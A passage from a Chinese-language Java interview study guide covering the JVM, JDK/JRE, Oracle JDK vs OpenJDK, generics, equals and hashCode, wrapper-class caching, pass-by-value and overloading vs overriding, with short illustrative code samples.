预热等各方面的开销。JDK 支持分层编译和 AOT 协作使用。但是 ，AOT 编译器的编译质量是肯定比不上 JIT 编译器的。\n 总结：\nJava 虚拟机（JVM）是运行 Java 字节码的虚拟机。JVM 有针对不同系统的特定实现（Windows，Linux，macOS），目的是使用相同的字节码，它们都会给出相同的结果。字节码和不同系统的 JVM 实现是 Java 语言“一次编译，随处可以运行”的关键所在。\nJDK 和 JRE    JDK 是 Java Development Kit 缩写，它是功能齐全的 Java SDK。它拥有 JRE 所拥有的一切，还有编译器（javac）和工具（如 javadoc 和 jdb）。它能够创建和编译程序。\nJRE 是 Java 运行时环境。它是运行已编译 Java 程序所需的所有内容的集合，包括 Java 虚拟机（JVM），Java 类库，java 命令和其他的一些基础构件。但是，它不能用于创建新程序。\n如果你只是为了运行一下 Java 程序的话，那么你只需要安装 JRE 就可以了。如果你需要进行一些 Java 编程方面的工作，那么你就需要安装 JDK 了。但是，这不是绝对的。有时，即使您不打算在计算机上进行任何 Java 开发，仍然需要安装 JDK。例如，如果要使用 JSP 部署 Web 应用程序，那么从技术上讲，您只是在应用程序服务器中运行 Java 程序。那你为什么需要 JDK 呢？因为应用程序服务器会将 JSP 转换为 Java servlet，并且需要使用 JDK 来编译 servlet。\n为什么说 Java 语言“编译与解释并存”？    高级编程语言按照程序的执行方式分为编译型和解释型两种。简单来说，编译型语言是指编译器针对特定的操作系统将源代码一次性翻译成可被该平台执行的机器码；解释型语言是指解释器对源程序逐行解释成特定平台的机器码并立即执行。比如，你想阅读一本英文名著，你可以找一个英文翻译人员帮助你阅读， 有两种选择方式，你可以先等翻译人员将全本的英文名著（也就是源码）都翻译成汉语，再去阅读，也可以让翻译人员翻译一段，你在旁边阅读一段，慢慢把书读完。\nJava 语言既具有编译型语言的特征，也具有解释型语言的特征，因为 Java 程序要经过先编译，后解释两个步骤，由 Java 编写的程序需要先经过编译步骤，生成字节码（*.class 文件），这种字节码必须由 Java 解释器来解释执行。因此，我们可以认为 Java 语言编译与解释并存。\nOracle JDK 和 OpenJDK 的对比    可能在看这个问题之前很多人和我一样并没有接触和使用过 OpenJDK 。那么 Oracle JDK 和 OpenJDK 之间是否存在重大差异？下面我通过收集到的一些资料，为你解答这个被很多人忽视的问题。\n对于 Java 7，没什么关键的地方。OpenJDK 项目主要基于 Sun 捐赠的 HotSpot 源代码。此外，OpenJDK 被选为 Java 7 的参考实现，由 Oracle 工程师维护。关于 JVM，JDK，JRE 和 OpenJDK 之间的区别，Oracle 博客帖子在 2012 年有一个更详细的答案：\n 问：OpenJDK 存储库中的源代码与用于构建 Oracle JDK 的代码之间有什么区别？\n答：非常接近 - 我们的 Oracle JDK 版本构建过程基于 OpenJDK 7 构建，只添加了几个部分，例如部署代码，其中包括 Oracle 的 Java 插件和 Java WebStart 的实现，以及一些闭源的第三方组件，如图形光栅化器，一些开源的第三方组件，如 Rhino，以及一些零碎的东西，如附加文档或第三方字体。展望未来，我们的目的是开源 Oracle JDK 的所有部分，除了我们考虑商业功能的部分。\n 总结：\n Oracle JDK 大概每 6 个月发一次主要版本，而 OpenJDK 版本大概每三个月发布一次。但这不是固定的，我觉得了解这个没啥用处。详情参见：https://blogs.oracle.com/java-platform-group/update-and-faq-on-the-java-se-release-cadence 。 OpenJDK 是一个参考模型并且是完全开源的，而 Oracle JDK 是 OpenJDK 的一个实现，并不是完全开源的； Oracle JDK 比 OpenJDK 更稳定。OpenJDK 和 Oracle JDK 的代码几乎相同，但 Oracle JDK 有更多的类和一些错误修复。因此，如果您想开发企业/商业软件，我建议您选择 Oracle JDK，因为它经过了彻底的测试和稳定。某些情况下，有些人提到在使用 OpenJDK 可能会遇到了许多应用程序崩溃的问题，但是，只需切换到 Oracle JDK 就可以解决问题； 在响应性和 JVM 性能方面，Oracle JDK 与 OpenJDK 相比提供了更好的性能； Oracle JDK 不会为即将发布的版本提供长期支持，用户每次都必须通过更新到最新版本获得支持来获取最新版本； Oracle JDK 使用 BCL/OTN 协议获得许可，而 OpenJDK 根据 GPL v2 许可获得许可。  🌈 拓展一下：\n BCL 协议（Oracle Binary Code License Agreement）： 可以使用JDK（支持商用），但是不能进行修改。 OTN 协议（Oracle Technology Network License Agreement）： 11 及之后新发布的JDK用的都是这个协议，可以自己私下用，但是商用需要付费。  相关阅读👍：《Differences Between Oracle JDK and OpenJDK》\nJava 和 C++的区别?    我知道很多人没学过 C++，但是面试官就是没事喜欢拿咱们 Java 和 C++ 比呀！没办法！！！就算没学过 C++，也要记下来！\n 都是面向对象的语言，都支持封装、继承和多态 Java 不提供指针来直接访问内存，程序内存更加安全 Java 的类是单继承的，C++ 支持多重继承；虽然 Java 的类不可以多继承，但是接口可以多继承。 Java 有自动内存管理垃圾回收机制(GC)，不需要程序员手动释放无用内存。 C ++同时支持方法重载和操作符重载，但是 Java 只支持方法重载（操作符重载增加了复杂性，这与 Java 最初的设计思想不符）。 \u0026hellip;\u0026hellip;  import java 和 javax 有什么区别？    刚开始的时候 JavaAPI 所必需的包是 java 开头的包，javax 当时只是扩展 API 包来使用。然而随着时间的推移，javax 逐渐地扩展成为 Java API 的组成部分。但是，将扩展从 javax 包移动到 java 包确实太麻烦了，最终会破坏一堆现有的代码。因此，最终决定 javax 包将成为标准 API 的一部分。\n所以，实际上 java 和 javax 没有区别。这都是一个名字。\n基本语法    字符型常量和字符串常量的区别?      形式 : 字符常量是单引号引起的一个字符，字符串常量是双引号引起的 0 个或若干个字符\n  含义 : 字符常量相当于一个整型值( ASCII 值),可以参加表达式运算; 字符串常量代表一个地址值(该字符串在内存中存放位置)\n  占内存大小 ： 字符常量只占 2 个字节; 字符串常量占若干个字节 (注意： char 在 Java 中占两个字节),\n 字符封装类 Character 有一个成员常量 Character.SIZE 值为 16,单位是bits,该值除以 8(1byte=8bits)后就可以得到 2 个字节\n    java 编程思想第四版：2.2.2 节  注释    Java 中的注释有三种：\n  单行注释\n  多行注释\n  文档注释。\n  在我们编写代码的时候，如果代码量比较少，我们自己或者团队其他成员还可以很轻易地看懂代码，但是当项目结构一旦复杂起来，我们就需要用到注释了。注释并不会执行(编译器在编译代码之前会把代码中的所有注释抹掉,字节码中不保留注释)，是我们程序员写给自己看的，注释是你的代码说明书，能够帮助看代码的人快速地理清代码之间的逻辑关系。因此，在写程序的时候随手加上注释是一个非常好的习惯。\n《Clean Code》这本书明确指出：\n 代码的注释不是越详细越好。实际上好的代码本身就是注释，我们要尽量规范和美化自己的代码来减少不必要的注释。\n若编程语言足够有表达力，就不需要注释，尽量通过代码来阐述。\n举个例子：\n去掉下面复杂的注释，只需要创建一个与注释所言同一事物的函数即可\n// check to see if the employee is eligible for full benefits if ((employee.flags \u0026amp; HOURLY_FLAG) \u0026amp;\u0026amp; (employee.age \u0026gt; 65)) 应替换为\nif (employee.isEligibleForFullBenefits())  标识符和关键字的区别是什么？    在我们编写程序的时候，需要大量地为程序、类、变量、方法等取名字，于是就有了标识符，简单来说，标识符就是一个名字。但是有一些标识符，Java 语言已经赋予了其特殊的含义，只能用于特定的地方，这种特殊的标识符就是关键字。因此，关键字是被赋予特殊含义的标识符。比如，在我们的日常生活中 ，“警察局”这个名字已经被赋予了特殊的含义，所以如果你开一家店，店的名字不能叫“警察局”，“警察局”就是我们日常生活中的关键字。\nJava 中有哪些常见的关键字？       分类 关键字           访问控制 private protected public       类，方法和变量修饰符 abstract class extends final implements interface native    new static strictfp synchronized transient volatile    程序控制 break continue return do while if else    for instanceof switch case default     错误处理 try catch throw throws finally     包相关 import package        基本类型 boolean byte char double float int long    short null true false      变量引用 super this void       保留字 goto const         自增自减运算符    在写代码的过程中，常见的一种情况是需要某个整数类型变量增加 1 或减少 1，Java 提供了一种特殊的运算符，用于这种表达式，叫做自增运算符（++)和自减运算符（\u0026ndash;）。\n++和\u0026ndash;运算符可以放在变量之前，也可以放在变量之后，当运算符放在变量之前时(前缀)，先自增/减，再赋值；当运算符放在变量之后时(后缀)，先赋值，再自增/减。例如，当 b = ++a 时，先自增（自己增加 1），再赋值（赋值给 b）；当 b = a++ 时，先赋值(赋值给 b)，再自增（自己增加 1）。也就是，++a 输出的是 a+1 的值，a++输出的是 a 值。用一句口诀就是：“符号在前就先加/减，符号在后就后加/减”。\ncontinue、break、和 return 的区别是什么？    在循环结构中，当循环条件不满足或者循环次数达到要求时，循环会正常结束。但是，有时候可能需要在循环的过程中，当发生了某种条件之后 ，提前终止循环，这就需要用到下面几个关键词：\n continue ：指跳出当前的这一次循环，继续下一次循环。 break ：指跳出整个循环体，继续执行循环下面的语句。  return 用于跳出所在方法，结束该方法的运行。return 一般有两种用法：\n return; ：直接使用 return 结束方法执行，用于没有返回值函数的方法 return value; ：return 一个特定值，用于有返回值函数的方法  Java 泛型了解么？什么是类型擦除？介绍一下常用的通配符？    Java 泛型（generics）是 JDK 5 中引入的一个新特性, 泛型提供了编译时类型安全检测机制，该机制允许程序员在编译时检测到非法的类型。泛型的本质是参数化类型，也就是说所操作的数据类型被指定为一个参数。\nJava 的泛型是伪泛型，这是因为 Java 在运行期间，所有的泛型信息都会被擦掉，这也就是通常所说类型擦除 。\nList\u0026lt;Integer\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); list.add(12); //这里直接添加会报错 list.add(\u0026#34;a\u0026#34;); Class\u0026lt;? extends List\u0026gt; clazz = list.getClass(); Method add = clazz.getDeclaredMethod(\u0026#34;add\u0026#34;, Object.class); //但是通过反射添加，是可以的 add.invoke(list, \u0026#34;kl\u0026#34;); System.out.println(list); 泛型一般有三种使用方式:泛型类、泛型接口、泛型方法。\n1.泛型类：\n//此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型 //在实例化泛型类时，必须指定T的具体类型 public class Generic\u0026lt;T\u0026gt; { private T key; public Generic(T key) { this.key = key; } public T getKey() { return key; } } 如何实例化泛型类：\nGeneric\u0026lt;Integer\u0026gt; genericInteger = new Generic\u0026lt;Integer\u0026gt;(123456); 2.泛型接口 ：\npublic interface Generator\u0026lt;T\u0026gt; { public T method(); } 实现泛型接口，不指定类型：\nclass GeneratorImpl\u0026lt;T\u0026gt; implements Generator\u0026lt;T\u0026gt;{ @Override public T method() { return null; } } 实现泛型接口，指定类型：\nclass GeneratorImpl implements Generator\u0026lt;String\u0026gt;{ @Override public String method() { return \u0026#34;hello\u0026#34;; } } 3.泛型方法 ：\npublic static \u0026lt;E\u0026gt; void printArray(E[] inputArray) { for (E element : inputArray) { System.out.printf(\u0026#34;%s \u0026#34;, element); } System.out.println(); } 使用：\n// 创建不同类型数组： Integer, Double 和 Character Integer[] intArray = { 1, 2, 3 }; String[] stringArray = { \u0026#34;Hello\u0026#34;, \u0026#34;World\u0026#34; }; printArray(intArray); printArray(stringArray); 常用的通配符为： T，E，K，V，？\n ？ 表示不确定的 java 类型 T (type) 表示具体的一个 java 类型 K V (key value) 分别代表 java 键值中的 Key Value E (element) 代表 Element  ==和 equals 的区别    对于基本数据类型来说，==比较的是值。对于引用数据类型来说，==比较的是对象的内存地址。\n 因为 Java 只有值传递，所以，对于 == 来说，不管是比较基本数据类型，还是引用数据类型的变量，其本质比较的都是值，只是引用类型变量存的值是对象的地址。\n equals() 作用不能用于判断基本数据类型的变量，只能用来判断两个对象是否相等。equals()方法存在于Object类中，而Object类是所有类的直接或间接父类。\nObject 类 equals() 方法：\npublic boolean equals(Object obj) { return (this == obj); } equals() 方法存在两种使用情况：\n 类没有覆盖 equals()方法 ：通过equals()比较该类的两个对象时，等价于通过“==”比较这两个对象，使用的默认是 Object类equals()方法。 类覆盖了 equals()方法 ：一般我们都覆盖 equals()方法来比较两个对象中的属性是否相等；若它们的属性相等，则返回 true(即，认为这两个对象相等)。  举个例子：\npublic class test1 { public static void main(String[] args) { String a = new String(\u0026#34;ab\u0026#34;); // a 为一个引用  String b = new String(\u0026#34;ab\u0026#34;); // b为另一个引用,对象的内容一样  String aa = \u0026#34;ab\u0026#34;; // 放在常量池中  String bb = \u0026#34;ab\u0026#34;; // 从常量池中查找  if (aa == bb) // true  System.out.println(\u0026#34;aa==bb\u0026#34;); if (a == b) // false，非同一对象  System.out.println(\u0026#34;a==b\u0026#34;); if (a.equals(b)) // true  System.out.println(\u0026#34;aEQb\u0026#34;); if (42 == 42.0) { // true  System.out.println(\u0026#34;true\u0026#34;); } } } 说明：\n String 中的 equals 方法是被重写过的，因为 Object 的 equals 方法是比较的对象的内存地址，而 String 的 equals 方法比较的是对象的值。 当创建 String 类型的对象时，虚拟机会在常量池中查找有没有已经存在的值和要创建的值相同的对象，如果有就把它赋给当前引用。如果没有就在常量池中重新创建一个 String 对象。  String类equals()方法：\npublic boolean equals(Object anObject) { if (this == anObject) { return true; } if (anObject instanceof String) { String anotherString = (String)anObject; int n = value.length; if (n == anotherString.value.length) { char v1[] = value; char v2[] = anotherString.value; int i = 0; while (n-- != 0) { if (v1[i] != v2[i]) return false; i++; } return true; } } return false; } hashCode()与 equals()    面试官可能会问你：“你重写过 hashcode 和 equals么，为什么重写 equals 时必须重写 hashCode 方法？”\n1)hashCode()介绍:\nhashCode() 的作用是获取哈希码，也称为散列码；它实际上是返回一个 int 整数。这个哈希码的作用是确定该对象在哈希表中的索引位置。hashCode()定义在 JDK 的 Object 类中，这就意味着 Java 中的任何类都包含有 hashCode() 函数。另外需要注意的是： Object 的 hashcode 方法是本地方法，也就是用 c 语言或 c++ 实现的，该方法通常用来将对象的 内存地址 转换为整数之后返回。\npublic native int hashCode(); 散列表存储的是键值对(key-value)，它的特点是：能根据“键”快速的检索出对应的“值”。这其中就利用到了散列码！（可以快速找到所需要的对象）\n2)为什么要有 hashCode？\n我们以“HashSet 如何检查重复”为例子来说明为什么要有 hashCode？\n当你把对象加入 HashSet 时，HashSet 会先计算对象的 hashcode 值来判断对象加入的位置，同时也会与其他已经加入的对象的 hashcode 值作比较，如果没有相符的 hashcode，HashSet 会假设对象没有重复出现。但是如果发现有相同 hashcode 值的对象，这时会调用 equals() 方法来检查 hashcode 相等的对象是否真的相同。如果两者相同，HashSet 就不会让其加入操作成功。如果不同的话，就会重新散列到其他位置。（摘自我的 Java 启蒙书《Head First Java》第二版）。这样我们就大大减少了 equals 的次数，相应就大大提高了执行速度。\n3)为什么重写 equals 时必须重写 hashCode 方法？\n如果两个对象相等，则 hashcode 一定也是相同的。两个对象相等,对两个对象分别调用 equals 方法都返回 true。但是，两个对象有相同的 hashcode 值，它们也不一定是相等的 。因此，equals 方法被覆盖过，则 hashCode 方法也必须被覆盖。\n hashCode()的默认行为是对堆上的对象产生独特值。如果没有重写 hashCode()，则该 class 的两个对象无论如何都不会相等（即使这两个对象指向相同的数据）\n 4)为什么两个对象有相同的 hashcode 值，它们也不一定是相等的？\n在这里解释一位小伙伴的问题。以下内容摘自《Head Fisrt Java》。\n因为 hashCode() 所使用的哈希算法也许刚好会让多个对象传回相同的哈希值。越糟糕的哈希算法越容易碰撞，但这也与数据值域分布的特性有关（所谓碰撞也就是指的是不同的对象得到相同的 hashCode )。\n我们刚刚也提到了 HashSet,如果 HashSet 在对比的时候，同样的 hashcode 有多个对象，它会使用 equals() 来判断是否真的相同。也就是说 hashcode 只是用来缩小查找成本。\n更多关于 hashcode() 和 equals() 的内容可以查看：Java hashCode() 和 equals()的若干问题解答\n基本数据类型    Java 中的几种基本数据类型是什么？对应的包装类型是什么？各自占用多少字节呢？    Java 中有 8 种基本数据类型，分别为：\n 6 种数字类型 ：byte、short、int、long、float、double 1 种字符类型：char 1 种布尔型：boolean。  这 8 种基本数据类型的默认值以及所占空间的大小如下：\n   基本类型 位数 字节 默认值     int 32 4 0   short 16 2 0   long 64 8 0L   byte 8 1 0   char 16 2 \u0026lsquo;u0000\u0026rsquo;   float 32 4 0f   double 64 8 0d   boolean 1  false    另外，对于 boolean，官方文档未明确定义，它依赖于 JVM 厂商的具体实现。逻辑上理解是占用 1 位，但是实际中会考虑计算机高效存储因素。\n注意：\n Java 里使用 long 类型的数据一定要在数值后面加上 L，否则将作为整型解析。 char a = 'h'char :单引号，String a = \u0026quot;hello\u0026quot; :双引号。  这八种基本类型都有对应的包装类分别为：Byte、Short、Integer、Long、Float、Double、Character、Boolean 。\n包装类型不赋值就是 Null ，而基本类型有默认值且不是 Null。\n另外，这个问题建议还可以先从 JVM 层面来分析。\n基本数据类型直接存放在 Java 虚拟机栈中的局部变量表中，而包装类型属于对象类型，我们知道对象实例都存在于堆中。相比于对象类型， 基本数据类型占用的空间非常小。\n 《深入理解 Java 虚拟机》 ：局部变量表主要存放了编译期可知的基本数据类型 （boolean、byte、char、short、int、float、long、double）、对象引用（reference 类型，它不同于对象本身，可能是一个指向对象起始地址的引用指针，也可能是指向一个代表对象的句柄或其他与此对象相关的位置）。\n 自动装箱与拆箱     装箱：将基本类型用它们对应的引用类型包装起来； 拆箱：将包装类型转换为基本数据类型；  举例：\nInteger i = 10; //装箱 int n = i; //拆箱 上面这两行代码对应的字节码为：\nL1 LINENUMBER 8 L1 ALOAD 0 BIPUSH 10 INVOKESTATIC java/lang/Integer.valueOf (I)Ljava/lang/Integer; PUTFIELD AutoBoxTest.i : Ljava/lang/Integer; L2 LINENUMBER 9 L2 ALOAD 0 ALOAD 0 GETFIELD AutoBoxTest.i : Ljava/lang/Integer; INVOKEVIRTUAL java/lang/Integer.intValue ()I PUTFIELD AutoBoxTest.n : I RETURN 从字节码中，我们发现装箱其实就是调用了 包装类的valueOf()方法，拆箱其实就是调用了 xxxValue()方法。\n因此，\n Integer i = 10 等价于 Integer i = Integer.valueOf(10) int n = i 等价于 int n = i.intValue();  8 种基本类型的包装类和常量池    Java 基本类型的包装类的大部分都实现了常量池技术。Byte,Short,Integer,Long 这 4 种包装类默认创建了数值 [-128，127] 的相应类型的缓存数据，Character 创建了数值在[0,127]范围的缓存数据，Boolean 直接返回 True Or False。\nInteger 缓存源码：\n/** *此方法将始终缓存-128 到 127（包括端点）范围内的值，并可以缓存此范围之外的其他值。 */ public static Integer valueOf(int i) { if (i \u0026gt;= IntegerCache.low \u0026amp;\u0026amp; i \u0026lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); } private static class IntegerCache { static final int low = -128; static final int high; static final Integer cache[]; } Character 缓存源码:\npublic static Character valueOf(char c) { if (c \u0026lt;= 127) { // must cache  return CharacterCache.cache[(int)c]; } return new Character(c); } private static class CharacterCache { private CharacterCache(){} static final Character cache[] = new Character[127 + 1]; static { for (int i = 0; i \u0026lt; cache.length; i++) cache[i] = new Character((char)i); } } Boolean 缓存源码：\npublic static Boolean valueOf(boolean b) { return (b ? TRUE : FALSE); } 如果超出对应范围仍然会去创建新的对象，缓存的范围区间的大小只是在性能和资源之间的权衡。\n两种浮点数类型的包装类 Float,Double 并没有实现常量池技术。\nInteger i1 = 33; Integer i2 = 33; System.out.println(i1 == i2);// 输出 true  Float i11 = 333f; Float i22 = 333f; System.out.println(i11 == i22);// 输出 false  Double i3 = 1.2; Double i4 = 1.2; System.out.println(i3 == i4);// 输出 false 下面我们来看一下问题。下面的代码的输出结果是 true 还是 flase 呢？\nInteger i1 = 40; Integer i2 = new Integer(40); System.out.println(i1==i2); Integer i1=40 这一行代码会发生装箱，也就是说这行代码等价于 Integer i1=Integer.valueOf(40) 。因此，i1 直接使用的是常量池中的对象。而Integer i1 = new Integer(40) 会直接创建新的对象。\n因此，答案是 false 。你答对了吗？\n记住：所有整型包装类对象之间值的比较，全部使用 equals 方法比较。\n方法（函数）    什么是方法的返回值?    方法的返回值是指我们获取到的某个方法体中的代码执行后产生的结果！（前提是该方法可能产生结果）。返回值的作用是接收出结果，使得它可以用于其他的操作！\n方法有哪几种类型？    1.无参数无返回值的方法\n// 无参数无返回值的方法(如果方法没有返回值，不能不写，必须写void，表示没有返回值) public void f1() { System.out.println(\u0026#34;无参数无返回值的方法\u0026#34;); } 2.有参数无返回值的方法\n/** * 有参数无返回值的方法 * 参数列表由零组到多组“参数类型+形参名”组合而成，多组参数之间以英文逗号（,）隔开，形参类型和形参名之间以英文空格隔开 */ public void f2(int a, String b, int c) { System.out.println(a + \u0026#34;--\u0026gt;\u0026#34; + b + \u0026#34;--\u0026gt;\u0026#34; + c); } 3.有返回值无参数的方法\n// 有返回值无参数的方法（返回值可以是任意的类型,在函数里面必须有return关键字返回对应的类型） public int f3() { System.out.println(\u0026#34;有返回值无参数的方法\u0026#34;); return 2; } 4.有返回值有参数的方法\n// 有返回值有参数的方法 public int f4(int a, int b) { return a * b; } 5.return 在无返回值方法的特殊使用\n// return在无返回值方法的特殊使用 public void f5(int a) { if (a \u0026gt; 10) { return;//表示结束所在方法 （f5方法）的执行,下方的输出语句不会执行  } System.out.println(a); } 在一个静态方法内调用一个非静态成员为什么是非法的?    这个需要结合 JVM 的相关知识，静态方法是属于类的，在类加载的时候就会分配内存，可以通过类名直接访问。而非静态成员属于实例对象，只有在对象实例化之后才存在，然后通过类的实例对象去访问。在类的非静态成员不存在的时候静态成员就已经存在了，此时调用在内存中还不存在的非静态成员，属于非法操作。\n静态方法和实例方法有何不同？    1、调用方式\n在外部调用静态方法时，可以使用 类名.方法名 的方式，也可以使用 对象.方法名 的方式，而实例方法只有后面这种方式。也就是说，调用静态方法可以无需创建对象 。\n不过，需要注意的是一般不建议使用 对象.方法名 的方式来调用静态方法。这种方式非常容易造成混淆，静态方法不属于类的某个对象而是属于这个类。\n因此，一般建议使用 类名.方法名 的方式来调用静态方法。\npublic class Person { public void method() { //......  } public static void staicMethod(){ //......  } public static void main(String[] args) { Person person = new Person(); // 调用实例方法  person.method(); // 调用静态方法  Person.staicMethod() } } 2、访问类成员是否存在限制\n静态方法在访问本类的成员时，只允许访问静态成员（即静态成员变量和静态方法），不允许访问实例成员（即实例成员变量和实例方法），而实例方法不存在这个限制。\n为什么 Java 中只有值传递？    首先，我们回顾一下在程序设计语言中有关将参数传递给方法（或函数）的一些专业术语。\n按值调用(call by value) 表示方法接收的是调用者提供的值，按引用调用（call by reference) 表示方法接收的是调用者提供的变量地址。一个方法可以修改传递引用所对应的变量值，而不能修改传递值调用所对应的变量值。它用来描述各种程序设计语言（不只是 Java）中方法参数传递方式。\nJava 程序设计语言总是采用按值调用。也就是说，方法得到的是所有参数值的一个拷贝，也就是说，方法不能修改传递给它的任何参数变量的内容。\n下面通过 3 个例子来给大家说明\n example 1\n public static void main(String[] args) { int num1 = 10; int num2 = 20; swap(num1, num2); System.out.println(\u0026#34;num1 = \u0026#34; + num1); System.out.println(\u0026#34;num2 = \u0026#34; + num2); } public static void swap(int a, int b) { int temp = a; a = b; b = temp; System.out.println(\u0026#34;a = \u0026#34; + a); System.out.println(\u0026#34;b = \u0026#34; + b); } 结果：\na = 20 b = 10 num1 = 10 num2 = 20 解析：\n在 swap 方法中，a、b 的值进行交换，并不会影响到 num1、num2。因为，a、b 中的值，只是从 num1、num2 的复制过来的。也就是说，a、b 相当于 num1、num2 的副本，副本的内容无论怎么修改，都不会影响到原件本身。\n通过上面例子，我们已经知道了一个方法不能修改一个基本数据类型的参数，而对象引用作为参数就不一样，请看 example2.\n example 2\n public static void main(String[] args) { int[] arr = { 1, 2, 3, 4, 5 }; System.out.println(arr[0]); change(arr); System.out.println(arr[0]); } public static void change(int[] array) { // 将数组的第一个元素变为0 \tarray[0] = 0; } 结果：\n1 0 解析：\narray 被初始化 arr 的拷贝也就是一个对象的引用，也就是说 array 和 arr 指向的是同一个数组对象。 因此，外部对引用对象的改变会反映到所对应的对象上。\n通过 example2 我们已经看到，实现一个改变对象参数状态的方法并不是一件难事。理由很简单，方法得到的是对象引用的拷贝，对象引用及其他的拷贝同时引用同一个对象。\n很多程序设计语言（特别是，C++和 Pascal)提供了两种参数传递的方式：值调用和引用调用。有些程序员（甚至本书的作者）认为 Java 程序设计语言对对象采用的是引用调用，实际上，这种理解是不对的。由于这种误解具有一定的普遍性，所以下面给出一个反例来详细地阐述一下这个问题。\n example 3\n public class Test { public static void main(String[] args) { // TODO Auto-generated method stub \tStudent s1 = new Student(\u0026#34;小张\u0026#34;); Student s2 = new Student(\u0026#34;小李\u0026#34;); Test.swap(s1, s2); System.out.println(\u0026#34;s1:\u0026#34; + s1.getName()); System.out.println(\u0026#34;s2:\u0026#34; + s2.getName()); } public static void swap(Student x, Student y) { Student temp = x; x = y; y = temp; System.out.println(\u0026#34;x:\u0026#34; + x.getName()); System.out.println(\u0026#34;y:\u0026#34; + y.getName()); } } 结果：\nx:小李 y:小张 s1:小张 s2:小李 解析：\n交换之前：\n交换之后：\n通过上面两张图可以很清晰的看出： 方法并没有改变存储在变量 s1 和 s2 中的对象引用。swap 方法的参数 x 和 y 被初始化为两个对象引用的拷贝，这个方法交换的是这两个拷贝\n 总结\n Java 程序设计语言对对象采用的不是引用调用，实际上，对象引用是按 值传递的。\n下面再总结一下 Java 中方法参数的使用情况：\n 一个方法不能修改一个基本数据类型的参数（即数值型或布尔型）。 一个方法可以改变一个对象参数的状态。 一个方法不能让对象参数引用一个新的对象。  参考：\n《Java 核心技术卷 Ⅰ》基础知识第十版第四章 4.5 小节\n重载和重写的区别     重载就是同样的一个方法能够根据输入数据的不同，做出不同的处理\n重写就是当子类继承自父类的相同方法，输入数据一样，但要做出有别于父类的响应时，你就要覆盖父类方法\n 重载    发生在同一个类中（或者父类和子类之间），方法名必须相同，参数类型不同、个数不同、顺序不同，方法返回值和访问修饰符可以不同。\n下面是《Java 核心技术》对重载这个概念的介绍：\n综上：重载就是同一个类中多个同名方法根据不同的传参来执行不同的逻辑处理。\n重写    重写发生在运行期，是子类对父类的允许访问的方法的实现过程进行重新编写。\n 返回值类型、方法名、参数列表必须相同，抛出的异常范围小于等于父类，访问修饰符范围大于等于父类。 如果父类方法访问修饰符为 private/final/static 则子类就不能重写该方法，但是被 static 修饰的方法能够被再次声明。 构造方法无法被重写  综上：重写就是子类对父类方法的重新改造，外部样子不能改变，内部逻辑可以改变\n暖心的 Guide 哥最后再来个图表总结一下！\n   区别点 重载方法 重写方法     发生范围 同一个类 子类   参数列表 必须修改 一定不能修改   返回类型 可修改 子类方法返回值类型应比父类方法返回值类型更小或相等   异常 可修改 子类方法声明抛出的异常类应比父类方法声明抛出的异常类更小或相等；   访问修饰符 可修改 一定不能做更严格的限制（可以降低限制）   发生阶段 编译期 运行期    方法的重写要遵循“两同两小一大”（以下内容摘录自《疯狂 Java 讲义》,issue#892 ）：\n “两同”即方法名相同、形参列表相同； “两小”指的是子类方法返回值类型应比父类方法返回值类型更小或相等，子类方法声明抛出的异常类应比父类方法声明抛出的异常类更小或相等； “一大”指的是子类方法的访问权限应比父类方法的访问权限更大或相等。  ⭐️ 关于 重写的返回值类型 这里需要额外多说明一下，上面的表述不太清晰准确：如果方法的返回类型是 void 和基本数据类型，则返回值重写时不可修改。但是如果方法的返回值是引用类型，重写时是可以返回该引用类型的子类的。\npublic class Hero { public String name() { return \u0026#34;超级英雄\u0026#34;; } } public class SuperMan extends Hero{ @Override public String name() { return \u0026#34;超人\u0026#34;; } public Hero hero() { return new Hero(); } } public class SuperSuperMan extends SuperMan { public String name() { return \u0026#34;超级超级英雄\u0026#34;; } @Override public SuperMan hero() { return new SuperMan(); } } 深拷贝 vs 浅拷贝     浅拷贝：对基本数据类型进行值传递，对引用数据类型进行引用传递般的拷贝，此为浅拷贝。 深拷贝：对基本数据类型进行值传递，对引用数据类型，创建一个新的对象，并复制其内容，此为深拷贝。  Java 面向对象    面向对象和面向过程的区别     面向过程 ：面向过程性能比面向对象高。 因为类调用时需要实例化，开销比较大，比较消耗资源，所以当性能是最重要的考量因素的时候，比如单片机、嵌入式开发、Linux/Unix 等一般采用面向过程开发。但是，面向过程没有面向对象易维护、易复用、易扩展。 面向对象 ：面向对象易维护、易复用、易扩展。 因为面向对象有封装、继承、多态性的特性，所以可以设计出低耦合的系统，使系统更加灵活、更加易于维护。但是，面向对象性能比面向过程低。  参见 issue : 面向过程 ：面向过程性能比面向对象高？？\n 这个并不是根本原因，面向过程也需要分配内存，计算内存偏移量，Java 性能差的主要原因并不是因为它是面向对象语言，而是 Java 是半编译语言，最终的执行代码并不是可以直接被 CPU 执行的二进制机械码。\n而面向过程语言大多都是直接编译成机械码在电脑上执行，并且其它一些面向过程的脚本语言性能也并不一定比 Java 好。\n 成员变量与局部变量的区别有哪些？     从语法形式上看，成员变量是属于类的，而局部变量是在代码块或方法中定义的变量或是方法的参数；成员变量可以被 public,private,static 等修饰符所修饰，而局部变量不能被访问控制修饰符及 static 所修饰；但是，成员变量和局部变量都能被 final 所修饰。 从变量在内存中的存储方式来看,如果成员变量是使用 static 修饰的，那么这个成员变量是属于类的，如果没有使用 static 修饰，这个成员变量是属于实例的。而对象存在于堆内存，局部变量则存在于栈内存。 从变量在内存中的生存时间上看，成员变量是对象的一部分，它随着对象的创建而存在，而局部变量随着方法的调用而自动消失。 从变量是否有默认值来看，成员变量如果没有被赋初，则会自动以类型的默认值而赋值（一种情况例外:被 final 修饰的成员变量也必须显式地赋值），而局部变量则不会自动赋值。  创建一个对象用什么运算符?对象实体与对象引用有何不同?    new 运算符，new 创建对象实例（对象实例在堆内存中），对象引用指向对象实例（对象引用存放在栈内存中）。\n一个对象引用可以指向 0 个或 1 个对象（一根绳子可以不系气球，也可以系一个气球）;一个对象可以有 n 个引用指向它（可以用 n 条绳子系住一个气球）。\n对象的相等与指向他们的引用相等,两者有什么不同?    对象的相等，比的是内存中存放的内容是否相等。而引用相等，比较的是他们指向的内存地址是否相等。\n一个类的构造方法的作用是什么? 若一个类没有声明构造方法，该程序能正确执行吗? 为什么?    构造方法主要作用是完成对类对象的初始化工作。\n如果一个类没有声明构造方法，也可以执行！因为一个类即使没有声明构造方法也会有默认的不带参数的构造方法。如果我们自己添加了类的构造方法（无论是否有参），Java 